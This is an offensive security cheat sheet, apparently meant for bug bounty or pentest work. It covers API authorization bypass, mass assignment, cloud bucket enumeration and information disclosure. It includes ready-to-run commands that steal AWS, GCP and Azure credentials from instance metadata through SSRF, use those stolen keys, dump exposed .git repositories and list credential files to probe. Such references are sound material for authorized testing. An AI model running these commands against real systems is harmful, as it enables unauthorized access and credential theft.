# API Security Testing

## What Is It
Test REST, GraphQL, SOAP APIs for auth bypass, BOLA, injection, data exposure.

## Features / Where to Find
- /api/v1/, /api/v2/, /rest/, /service/
- JSON responses with data
- Mobile app traffic (proxy Android/iOS)
- JavaScript files containing API calls
- Swagger/OpenAPI docs: /swagger, /api-docs, /openapi.json

---

## Actions / Attack Techniques

### API Discovery
```bash
# Find API endpoints in JS files
curl -s https://target.com/app.js | grep -oE '"(/api/[^"]+)"' | sort -u
curl -s https://target.com/app.js | grep -oE "'(/api/[^']+)'" | sort -u

# Common API paths
ffuf -u https://target.com/FUZZ -w api_wordlist.txt \
  -H "Accept: application/json" \
  -mc 200,201,401,403

# Swagger/API docs
https://target.com/swagger
https://target.com/swagger-ui
https://target.com/swagger.json
https://target.com/api-docs
https://target.com/openapi.json
https://target.com/redoc
https://target.com/v1/docs
```

### BOLA (Broken Object Level Authorization)
```bash
# Change object IDs in every request
GET /api/v1/users/{id}/orders        → change {id}
GET /api/v1/documents/{uuid}         → change uuid
DELETE /api/v1/resources/{id}        → delete others' resources

# Test with other user's token
curl -H "Authorization: Bearer USER_B_TOKEN" \
  https://target.com/api/v1/users/USER_A_ID/data
```

### BFLA (Broken Function Level Authorization)
```bash
# Regular user accessing admin functions
GET /api/v1/admin/users
GET /api/v1/internal/config
POST /api/v1/admin/users/delete

# HTTP method tampering
GET /api/v1/users/123        → try DELETE, PUT, PATCH
POST /api/v1/users/123/data  → try as unauthenticated
```

### Mass Assignment
```json
// Add undocumented fields
{"name": "John"}
// Attack:
{"name": "John", "role": "admin", "verified": true, "credits": 99999}
```

### Excessive Data Exposure
```bash
# API returns more data than needed
# Frontend filters it, but backend sends all fields
# Intercept raw response → look for hidden sensitive fields
# email, phone, ssn, credit_card, internal_id, password_hash
```

### API Versioning Attacks
```bash
# Old versions less secure
/api/v1/users  ← try older version
/api/v2/users  ← current (secured)
/api/v3/users  ← beta (less tested)
/api/beta/users
/api/internal/users
/api/dev/users
```

### Missing Authentication
```bash
# Remove auth header entirely
curl https://target.com/api/v1/users/data
# Without Authorization header

# Try different endpoints without auth
curl -X GET https://target.com/api/v1/export/users
```

---

## Tools
```bash
# Postman - API testing
# Insomnia - REST client

# mitmproxy - intercept mobile API
mitmproxy --listen-port 8080

# API fuzzing
ffuf -u "https://target.com/api/v1/FUZZ" \
  -w /wordlists/api_endpoints.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,204,400,403,500

# Parameter discovery
arjun -u "https://target.com/api/v1/users" -m GET
arjun -u "https://target.com/api/v1/users" -m POST

# Nuclei API templates
nuclei -u https://target.com -t exposures/apis/
```

---

# Cloud Security Testing

## AWS

### S3 Bucket Attacks
```bash
# Find buckets
curl https://target.s3.amazonaws.com
curl https://s3.amazonaws.com/target
aws s3 ls s3://target --no-sign-request

# List contents
aws s3 ls s3://target-bucket --no-sign-request

# Download files
aws s3 cp s3://target-bucket/config.txt . --no-sign-request

# Check ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Upload (write access test)
aws s3 cp test.txt s3://target-bucket/ --no-sign-request

# Find buckets via permutation
cloud_enum -k target -l -s -b
```

### AWS Metadata (via SSRF)
```bash
# Get credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Use stolen credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
aws secretsmanager list-secrets
```

### AWS Secrets Manager
```bash
# If you have AWS access
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME
```

## GCP

### GCP Metadata
```bash
# Via SSRF
curl "http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"

# Get service account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Use token
curl -H "Authorization: Bearer TOKEN" \
  "https://www.googleapis.com/storage/v1/b?project=PROJECT_ID"
```

### GCP Storage Buckets
```bash
curl https://storage.googleapis.com/target-bucket/
gsutil ls gs://target-bucket
gsutil ls -la gs://target-bucket
gsutil cp gs://target-bucket/sensitive.txt .
```

## Azure

### Azure Metadata
```bash
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"

curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
```

### Azure Blob Storage
```bash
# Public blob
curl https://target.blob.core.windows.net/container/file.txt

# List container (if public)
curl "https://target.blob.core.windows.net/container?restype=container&comp=list"

# Tools
```

## Cloud Recon Tools
```bash
# cloud_enum - find cloud assets
python3 cloud_enum.py -k target -k targetcompany

# S3Scanner
python3 s3scanner.py --bucket-file buckets.txt

# GrayhatWarfare - search public buckets
# https://buckets.grayhatwarfare.com/

# truffleHog - secrets in S3
trufflehog s3 --bucket=target-bucket

# Pacu - AWS exploitation framework
python3 pacu.py
```

---

# Information Disclosure

## What Is It
Application exposes sensitive information unintentionally.

## Features / Where to Find
- Error messages with stack traces
- Debug endpoints
- API responses with extra fields
- Comments in HTML/JS source
- HTTP response headers
- Backup files
- Git repository exposure
- Log files

## Actions

### Exposed .git Directory
```bash
# Check
curl https://target.com/.git/HEAD
# Response: ref: refs/heads/main = EXPOSED!

# Dump entire repo
git-dumper https://target.com/.git/ ./output/

# Find secrets in git history
cd output && git log --all --oneline
git show COMMIT_HASH
trufflehog git file://./output/
```

### Sensitive Files
```bash
# Check these
/.env
/config.php
/config.yml
/database.yml
/secrets.yml
/wp-config.php
/.aws/credentials
/application.properties
/appsettings.json
/web.config
/settings.py
/local_settings.py
/phpinfo.php
/server-status  (Apache)
/server-info
/nginx_status
```

### API Response Leakage
```bash
# Register and check response
POST /api/register
Response: {"id":123,"email":"test@test.com","role":"admin","internal_id":"abc123","password_hash":"$2b$..."}
# Password hash = information disclosure!
```

### Error Messages
```bash
# Trigger errors
https://target.com/api/user?id=INVALID
https://target.com/search?q='
# Look for: stack traces, DB errors, internal paths, versions
```

### JavaScript Source Analysis
```bash
# Download and analyze all JS files
# Find: API keys, endpoints, credentials, internal URLs

# Tools
LinkFinder -i https://target.com -d -o results.txt
SecretFinder -i https://target.com/app.js -o results.html

# Patterns to search
grep -iE "(api_key|apikey|secret|password|passwd|token|auth)" app.js
grep -iE "(aws_access|aws_secret|s3_bucket|firebase)" app.js
grep -oE '"(https?://[^"]+api[^"]+)"' app.js
```

## Report Template
**Title:** Sensitive information disclosure via [location]
**Severity:** High (credentials/keys) / Medium (PII) / Low (version info)
**Impact:** Depends on what's disclosed - could lead to full compromise
